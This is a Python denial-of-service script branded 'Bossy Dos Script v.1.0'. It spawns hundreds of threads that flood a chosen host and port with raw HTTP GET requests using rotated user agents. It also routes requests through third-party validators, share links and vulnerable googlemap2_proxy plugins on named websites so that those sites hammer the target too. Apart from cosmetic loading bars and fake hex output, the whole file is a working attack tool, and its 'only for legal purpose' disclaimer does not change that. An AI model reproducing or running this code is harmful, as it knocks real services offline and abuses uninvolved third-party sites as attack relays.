#!/usr/bin/python3
# -*- coding: utf-8 -*-

# python 3.3.2+ Bossy Dos Script v.1.0
# by Bossy
# only for legal purpose


from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random
import random
import time
import sys

	
print (" ")
print (''' \033[91m [*] Loading , Please Wait . . . \033[0m''')
print (" ")
time.sleep(5)
def load():
  print (''' \033[92m [*] Loading : [                    ] 0% \033[0m''')
  time.sleep(2)
  print (''' \033[94m [*] Loading : [...                 ] 15% \033[0m''')
  time.sleep(2)
  print (''' \033[96m [*] Loading : [......              ] 30% \033[0m''')
  time.sleep(2)
  print (''' \033[97m [*] Loading : [.........           ] 45% \033[0m''')
  time.sleep(2)
  print (''' \033[93m [*] Loading : [............        ] 60% \033[0m''')
  time.sleep(2)
  print (''' \033[95m [*] Loading : [...............     ] 75% \033[0m''')
  time.sleep(2)
  print (''' \033[90m [*] Loading : [..................  ] 90% \033[0m''')
  time.sleep(2)
  print (''' \033[99m [*] Loading : [....................] 100% \033[0m''')
  time.sleep(2)



load()
print (" ")
print (''' \033[91m [*] Starting . . . \033[0m''')
print (" ")
time.sleep(5)
sent = 0


def user_agent():
	global uagent
	uagent=[]
	uagent.append("Googlebot/2.1 (+http://www.google.com/bot.html)")
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
	uagent.append("Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1")
	uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41")
	uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36")
	uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0")
	uagent.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0")
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://validator.w3.org/feed/check.cgi?url=")
	bots.append("http://www.google.com/ig/adde?moduleurl=")
	bots.append("http://www.google.com/?q=")
	bots.append("http://www.google.com/ig/adde?moduleurl=")
	bots.append("http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=")
	bots.append("https://down.com/?q=")
	bots.append("http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=")
	bots.append("http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://www.feedvalidator.org/check.cgi?url=")
	bots.append("https://www.wizards.com/leaving.asp?url=")
	bots.append("http://jigsaw.w3.org/css-validator/validator?uri=")
	bots.append("http://feed.informer.com/validator/check.cgi?url=")
	bots.append("http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=")
	bots.append("http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=")
	bots.append("https://html5.validator.nu/?doc=")
	return(bots)


def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("\033[94m CD D7 9A 5A CF B0 70 C7 E9 D1 02 3B 87 02 85 D6 \033[0m")
			print("\033[94m CD 69 0D 11 8E AC AA C5 C5 EC BB 59 85 7D 49 3E \033[0m")
			print("\033[94m B8 A6 13 C5 4A 72 82 38 ED C3 7E 2C 59 5E AB FD \033[0m")
			print("\033[94m 06 F8 BB F3 B1 55 AE EE 1F 66 AE 51 1F F8 12 98 \033[0m")
			print("\033[94m CE 8A 9D A0 FC ED A6 DE 70 84 BA 90 83 7E CD 40 \033[0m")
			print("\033[94m FF 1D 41 E1 65 17 93 0E 64 32 BF 25 50 D5 4A 5E \033[0m")
			print("\033[94m 2B 20 90 8C EA 32 15 A6 26 62 93 27 66 66 E0 71 \033[0m")
			print("\033[94m 4E 27 D9 5B 00 91 53 57 88 9C 66 C8 B1 29 D1 CB \033[0m")
			print("\033[94m A1 90 16 62 6C B3 E2 DB BB D1 79 CB 75 D2 C7 89 \033[0m")
			print("\033[94m 59 4A C9 04 67 10 66 C5 97 83 7B C3 DA 6C 29 2E \033[0m")
			print("\033[94m CB 5A F8 CE 62 B2 1B F7 6F 50 C0 25 62 E9 5D 71 \033[0m")
			print("\033[94m 2F 1A 26 34 DD 9F 61 F7 68 85 CC BC 0F 88 88 73 \033[0m")
			print("\033[94m 6F CB 3F CC 06 0C 06 08 ED DF EC 3C D3 42 5D 78 \033[0m")
			print("\033[94m 8D EC 0C EA D2 BC 8A E2 D7 D3 A2 7F 9F 1A D3 21 \033[0m")
			print("\033[94m 9F C6 51 57 D3 FA 99 11 9D 17 12 BA B6 DB 06 B4 \033[0m")
			print("\033[94m 6D 02 BB DB 2C 6C 59 51 1E 35 E1 D3 A5 C0 5F 8A \033[0m")
			print("\033[94m F3 A7 BB 1A DF DF 5A 3F C8 74 DB 6F DF 58 63 66 \033[0m")
			print("\033[94m 06 BC D9 30 12 74 1A 25 A8 3A E6 1B 14 EC 71 05 \033[0m")
			print("\033[94m F3 6E 51 C5 A0 8E A1 63 2D 07 3A 2D C5 A0 15 A9 \033[0m")
			print("\033[94m A8 3E 76 D7 99 51 5C 20 DC 1C A9 E3 FD 77 22 5F \033[0m")
			print("\033[94m 5E F8 A5 65 EB 88 A7 AB AB 6F 56 A6 28 14 4F E2 \033[0m")
			print("\033[94m 93 44 CA 90 0E 15 04 B5 49 E9 10 FB FF 2A 54 AF \033[0m")
			print("\033[94m 8A D8 38 DD C7 05 39 9F 02 DE 96 0F 98 E1 C2 EF \033[0m")
			print("\033[94m 01 D0 A8 C4 75 C9 4A C3 04 32 E8 21 53 9E D5 1A \033[0m")
			print("\033[94m FC BB DD FE 34 37 AC 42 D6 15 06 70 0A 2A 6B B0 \033[0m")
			print("\033[94m D6 1C 6A 5C 3B 1D EE 40 C8 20 10 D1 7C 0F 5B A2 \033[0m")
			print("\033[94m 5A 92 8A 70 E6 36 2C DA 3E 36 6E CB AE F1 1B FC \033[0m")
			print("\033[94m 78 C5 54 82 BA 84 3F DE 2D 7A BD A0 BD E0 40 AB \033[0m")
			print("\033[94m 84 B2 3D 30 2D A0 87 D1 A3 2A AC 14 71 28 B5 82 \033[0m")
			print("\033[94m 5C 9D 3F B6 24 3B 3E 0F F7 C2 51 27 D4 D3 0E 97 \033[0m")
			print("\033[94m CB F0 4A 28 00 93 4A 8E DD 04 77 A3 A1 7D 15 D5 \033[0m")
			print("\033[94m AA 03 85 99 5C BF A7 32 5B 2F CD 93 C0 5B B5 F6 \033[0m")
			print("\033[94m DB A3 C7 43 62 F4 11 34 C6 DA BA 38 29 72 4D B9 \033[0m")
			print("\033[94m A3 11 47 A6 8F 90 63 46 1B 03 89 72 79 99 21 B3 \033[0m")
			print("\033[94m 9F B5 F4 B9 3C 8B EA DF A0 3E F4 D4 9D F5 16 62 \033[0m")
			print("\033[94m 39 E4 30 B3 2F 31 AA 37 AC 82 5A 55 B5 55 24 EE \033[0m")
			print("\033[94m 33 55 0B FC 4F 24 84 F4 9A 38 B3 D0 89 83 D2 49 \033[0m")
			print("\033[94m 73 F9 DE 89 67 A6 6D 2B 8E 46 2C 07 47 6A CE 08 \033[0m")
			print("\033[94m AD FB 65 D6 13 A9 9F 2C 65 E4 A6 08 F2 5A 67 97 \033[0m")
			print("\033[94m D9 6F 76 5B 8C D3 DF 13 2F BC DA 6A 6E D9 62 CD \033[0m")
			print("\033[94m 28 A8 C8 95 B7 17 E5 72 27 B6 A7 EE E3 E5 34 45 \033[0m")
			print("\033[94m AE 9B FB 91 23 4B 58 6B 41 85 1D FB BE 99 CB 14 \033[0m")
			print("\033[94m 77 74 CB 5C 26 AD C1 DC C7 76 62 AA 03 FB 74 07 \033[0m")
			print("\033[94m 22 11 47 37 41 1D 58 52 AC 70 0E 76 8D 43 E8 C6 \033[0m")
			print("\033[94m 6F F8 4B 41 97 04 BE E5 8D 78 DC 48 DF 37 81 DA \033[0m")
			print("\033[94m DD 79 8C 14 15 57 E5 07 5E F4 C0 C8 8C F2 50 37 \033[0m")
			print("\033[94m B0 58 6D 7D 5E 5B 43 0B A7 66 24 FB EF 2C 78 32 \033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m [*] Packet Sent ✓ AsparTim  \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mshut<->down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91m [!] No Connection ✓ Server Maybe Down\033[0m")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)
		


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+host)
		w.task_done()
		

def usage():
	print (''' \033[91mBossy Dos Script v.1 https://www.aspartim.org/
  ____  _____ ____   ____  ____  ______  ____  ___ ___ 
 /    |/ ___/|    \ /    ||    \|      ||    ||   |   |
|  o  (   \_ |  o  )  o  ||  D  )      | |  | | _   _ |
|     |\__  ||   _/|     ||    /|_|  |_| |  | |  \_/  |
|  _  |/  \ ||  |  |  _  ||    \  |  |   |  | |   |   |
|  |  |\    ||  |  |  |  ||  .  \ |  |   |  | |   |   |
|__|__| \___||__|  |__|__||__|\_| |__|  |____||___|___|
                                                       
                                \n
	usage : python3 bossyv1.0.py [-u] [-p] [-v]
	-h : help
	-u : server ip
	-p : port default 80
	-v : turbo default 200 \033[0m''')
	sys.exit()


def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Hammers")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-u","--server", dest="host",help="attack to server ip -u ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-v","--turbo",type="int",dest="turbo",help="default 200 -v 200")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 200
	else:
		thr = opts.turbo


# reading headers
global data
headers = open("proxy.txt", "r")
data = headers.read()
headers.close()
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
	print("\033[94m [*] Please Wait . . .\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.SOCK_DGRAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91m [*] Check Server İp And Port\033[0m")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()
